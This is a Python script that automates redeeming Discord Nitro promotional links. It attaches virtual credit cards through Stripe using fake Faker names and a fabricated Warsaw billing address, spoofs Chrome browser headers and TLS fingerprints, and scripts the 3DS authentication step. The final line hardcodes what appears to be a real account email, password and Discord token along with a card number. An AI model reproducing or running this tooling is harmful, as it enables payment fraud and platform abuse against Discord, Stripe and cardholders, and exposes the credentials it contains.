from tls_client import Session
from base64 import b64encode
from json import dumps
import json
from threading import Lock,Thread
from colorama import Fore
import requests
import datetime
import time
from threading import Lock
import os
import sys
from faker import Faker
from random import randint
import colorama
import urllib
colorama.init(autoreset=True)

thread_lock = Lock()
config = json.load(open("config.json"))
request_exceptions = (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.SSLError)

class Console():
    def success(message):
        print(f"{Fore.LIGHTGREEN_EX}[{datetime.datetime.now().strftime('%H:%M:%S')}] {message}{Fore.RESET}")

    
    def error(message):
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.datetime.now().strftime('%H:%M:%S')}] {Fore.LIGHTRED_EX}{message}{Fore.RESET}")


    def info(message):
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.datetime.now().strftime('%H:%M:%S')}] {Fore.LIGHTBLUE_EX}{message}{Fore.RESET}")


    def warning(message):
        print(f"{Fore.LIGHTBLACK_EX}[{datetime.datetime.now().strftime('%H:%M:%S')}] {Fore.LIGHTYELLOW_EX}{message}{Fore.RESET}")


class Utils():
    def build_num() -> int:
        response = requests.get("https://discord.com/app")
        js_version = response.text.split('"></script><script src="/assets/')[2].split('" integrity')[0]
        url = f"https://discord.com/assets/{js_version}"
        response = requests.get(url)
        build_number = response.text.split('(t="')[1].split('")?t:"")')[0]
        return int(build_number)
    
    def get_xproperties(buildnum : int):
        return b64encode(dumps({"os":"Windows","browser":"Discord Client","release_channel":"canary","client_version":"1.0.59","os_version":"10.0.22621","os_arch":"x64","system_locale":"en-US","client_build_number":buildnum,"native_build_number":31409,"client_event_source":None,"design_id":0}).encode()).decode()
    def remove_content(filename: str, delete_line: str) -> None:
        with thread_lock, open(filename, "r+") as file:
            lines = file.readlines()
            file.seek(0)
            file.writelines(line for line in lines if delete_line not in line)
            file.truncate()
buildnum = Utils.build_num()
Console.info(f'Successfully fetched build num -> {buildnum}')

class Main:
    def __init__(self, disc_token :  str, promo_link: str, full_vcc: str):
        self.disc_session = Session(client_identifier="chrome110")
        self.stripe_session = Session(client_identifier="chrome110")
        self.token = disc_token
        self.promo_link = promo_link
        self.card_num = full_vcc.split(':')[0]
        self.expiry_month = full_vcc.split(":")[1][0:2]
        self.expiry_year = full_vcc.split(":")[1][2:4]
        self.cvv = full_vcc.split(":")[2]
        self.fake = Faker()
        self.real_name = self.fake.name()
        self.line1 = "Steret Road 11"
        self.city = "Warsaw"
        self.state = "Warsaw"
        self.country = 'PL'
        self.postal_code = "10080"
        self.muid = 'dbb65eeb-b374-4689-b6bb-e87664866dd808646f'
        self.guid = '63204968-2f91-4f31-af1e-7286de54274eb90521'
        self.sid = '28076929-a631-4ec8-b7c9-21a77627c91826511c'
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        self.locale = 'en-US'
        if ":" in self.token:
            self.token = self.token.split(":")[2]
        self.promo_link = self.promo_link.replace("https://discord.com/billing/promotions/","").replace('https://promos.discord.gg/','')
        self.disc_session.get("https://discord.com/app",headers={
    'authority': 'discord.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': self.user_agent,
})

    def stripe_tokens(self) -> bool:
        self.time_on_page = randint(60000, 120000)
        while True:
            try:
                response = self.stripe_session.post('https://api.stripe.com/v1/tokens', headers={
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': self.user_agent,
}, data=f'card[number]={self.card_num}&card[cvc]={self.cvv}&card[exp_month]={int(self.expiry_month)}&card[exp_year]={self.expiry_year}&guid={self.guid}&muid={self.muid}&sid={self.sid}&payment_user_agent=stripe.js%2F2c266ddfa7%3B+stripe-js-v3%2F2c266ddfa7&time_on_page={self.time_on_page}&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&pasted_fields=number')
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                Console.error(str(e))
                return False
        if not response.status_code in [200,201,204]:
            Console.error(response.text)
            return False
        self.stripe_card_id = response.json()["id"]
        return True

    def setup_intents(self) -> bool:
        while True:
            try:
                response = self.disc_session.post('https://discord.com/api/v9/users/@me/billing/stripe/setup-intents', headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/channels/@me',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum),
})
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        if not response.status_code in [200,201,204]:

            return False
        self.stripe_client_secret = response.json()['client_secret']
        self.stripe_seti_id = self.stripe_client_secret.split("_secret")[0]
        return True
    
    def get_billing_address_token(self) -> bool:
        while True:
            try:
                response = self.disc_session.post(
    'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
    headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/channels/@me',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum=buildnum),
},
    json={
    'billing_address': {
        'name': self.real_name,
        'line_1': self.line1,
        'line_2': '',
        'city': self.city,
        'state': self.state,
        'postal_code': self.postal_code,
        'country': self.country,
        'email': '',
    },
},
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        if not response.status_code in [200,201,204]:
            return False
        self.billing_address_token = response.json()["token"]
        return True
    
    def stripe_confirm(self) -> None:
        time_on_page = randint(60000, 120000)
        while True:
            try:
                response = self.stripe_session.post(
    f'https://api.stripe.com/v1/setup_intents/{self.stripe_seti_id}/confirm',
    headers={
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': self.user_agent,
},data=f'payment_method_data[type]=card&payment_method_data[card][token]={self.stripe_card_id}&payment_method_data[billing_details][address][line1]={self.line1}&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]={self.city}&payment_method_data[billing_details][address][state]={self.state}&payment_method_data[billing_details][address][postal_code]={self.postal_code}&payment_method_data[billing_details][address][country]={self.country}&payment_method_data[billing_details][name]={self.real_name}&payment_method_data[guid]={self.guid}&payment_method_data[muid]={self.muid}&payment_method_data[sid]={self.sid}&payment_method_data[payment_user_agent]=stripe.js%2F2c266ddfa7%3B+stripe-js-v3%2F2c266ddfa7&payment_method_data[time_on_page]={time_on_page}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&client_secret={self.stripe_client_secret}',
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        if not response.status_code in [200,201,204]:
            return False
        self.pm_token = response.json()['payment_method']
        return True
    def add_pm_disc(self) -> None:
        while True:
            try:
                response = self.disc_session.post(
    'https://discord.com/api/v9/users/@me/billing/payment-sources',
    headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/channels/@me',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum),
},
    json={
    'payment_gateway': 1,
    'token': self.pm_token,
    'billing_address': {
        'name': self.real_name,
        'line_1':self.line1,
        'line_2': '',
        'city': self.city,
        'state': self.state,
        'postal_code': self.postal_code,
        'country': self.country,
        'email': '',
    },
    'billing_address_token': self.billing_address_token,
},
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        if not response.status_code in [200,201,204]:
            return False
        self.disc_pm_id = response.json()['id']
        return True
    
    def check_promo(self) -> None:
        while True:
            try:
                response = self.disc_session.get(f'https://discord.com/api/v9/entitlements/gift-codes/{self.promo_link}',
    params={'with_application': 'false','with_subscription_plan': 'true',},headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'referer': f'https://discord.com/billing/promotions/{self.promo_link}',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum),
},
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        if not response.status_code in [200,201,204]:
            return False
        if response.json()['uses']>0:
            return "redeemed"
        return True
            

    def redeem_promo(self) -> None:
        while True:
            try:
                response = self.disc_session.post(
    f'https://discord.com/api/v9/entitlements/gift-codes/{self.promo_link}/redeem',
    headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': f'https://discord.com/billing/promotions/{self.promo_link}',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum),
},json={
    'channel_id': None,
    'payment_source_id': self.disc_pm_id,
    'gateway_checkout_context': None,
},
)               
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        Console.info(response.text)
        if response.status_code in [200,201,204]:
            return True
        if "required" in response.text:
            return "auth" , response.json()["payment_id"]
        return False
    def auth_fix(self, payment_id):
        Console.info(payment_id)
        while True:
            try:
                response = self.disc_session.get(
    f'https://discord.com/api/v9/users/@me/billing/stripe/payment-intents/payments/{payment_id}',
    headers={
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.token,
    'referer': f'https://discord.com/billing/promotions/{self.promo_link}',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': self.user_agent,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': self.locale,
    'x-super-properties': Utils.get_xproperties(buildnum),
},
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        self.stripe_pm_client_secret = response.json()["stripe_payment_intent_client_secret"]
        self.client_secret_id = self.stripe_pm_client_secret.split('_secret')[0]
        while True:
            try:
                response = self.stripe_session.post(
    f'https://api.stripe.com/v1/payment_intents/{self.client_secret_id}/confirm',
    headers={
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': self.user_agent,
},
    data={
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
    'client_secret': self.stripe_pm_client_secret,
},
)
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
        self.threeDS_source = response.json()['next_action']['use_stripe_sdk']['three_d_secure_2_source']
        Console.info(self.threeDS_source)
        while True:
            try:
                response = self.stripe_session.post('https://api.stripe.com/v1/3ds2/authenticate', headers={
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': self.user_agent,
}, data={
            "source": self.threeDS_source,
            "browser": {"fingerprintAttempted":"false","fingerprintData":"null","challengeWindowSize":"null","threeDSCompInd":"Y","browserJavaEnabled":"false","browserJavascriptEnabled":"true","browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"768","browserScreenWidth":"1366","browserTZ":"420","browserUserAgent":self.user_agent},
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": "pk_live_CUQtlpQUF0vufWpnpUmQvcdi"
        })
                break
            except Exception as e:
                if "failed to do" in str(e):
                    continue
                return False
class Redeem:
    def __init__(self, discord_token: str, full_vcc : str, promo_link : str) -> None:
        redeem_obj = Main(discord_token,promo_link,full_vcc)

        if not redeem_obj.stripe_tokens():
            Console.error("Failed to get stripe tokens!")
            return
            
        if not redeem_obj.setup_intents():
            Console.error("Failed to setup intents!")
            return
        
        if not redeem_obj.get_billing_address_token():
            Console.error("Failed to get billing address token!")
            return
        
        if not redeem_obj.stripe_confirm():
            Console.error("Failed to setup confirm stripe token! [VCC invalid]")
            return
           
        if not redeem_obj.add_pm_disc():
            Console.error("Failed to link card!")
            return

        if not redeem_obj.check_promo():
            Console.error('Invalid promo link!')

        redeem = redeem_obj.redeem_promo()
        if redeem==True:
            Console.success(f"Activated -> {discord_token}")
        elif "auth" in str(redeem):
            Console.info("auth!")
            payment_id = redeem[1]
            redeem_obj.auth_fix(payment_id)
            redeem = redeem_obj.redeem_promo()
            if redeem==True:
                Console.success(f"Activated -> {discord_token}")
            else:
                Console.error(redeem)
        else:
            Console.error(f"Failed to activate -> {discord_token}")

Redeem("obeyboscheq@outlook.com:PmZP7dwchRhh:OTg4MDQ5Mjc4NDY1MzcyMjAw.Gq6rIS.9OFjEIMqTdJJ9vM-dWwxOTTYzz3YJ6LGEV4siA","5170611388448570:0425:123","https://promos.discord.gg/DdcsxyPh6jMXKpVaQbgmKwvz")
